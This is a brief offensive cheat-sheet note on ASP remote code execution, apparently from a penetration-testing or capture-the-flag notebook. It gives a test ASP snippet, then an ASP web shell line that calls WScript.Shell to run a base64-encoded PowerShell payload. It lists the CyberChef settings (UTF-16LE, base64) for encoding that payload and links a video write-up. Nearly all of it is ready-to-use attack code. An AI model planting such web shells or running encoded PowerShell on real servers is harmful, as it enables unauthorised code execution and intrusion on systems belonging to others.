
PoC ASP RCE
```asp
<%response.write(date())%>
```

ASP shell object with powershell encoded 
```asp
<% CreateObject("WScript.Shell").exec("powershell -enc $b64PwshShell") %>
```

cyberchef.io 
`UTF-16LE (1200)` & `base64 A-Za-z0-9+/=`

## References

[XCT Writeup](https://www.youtube.com/watch?v=pItffHaDAcU)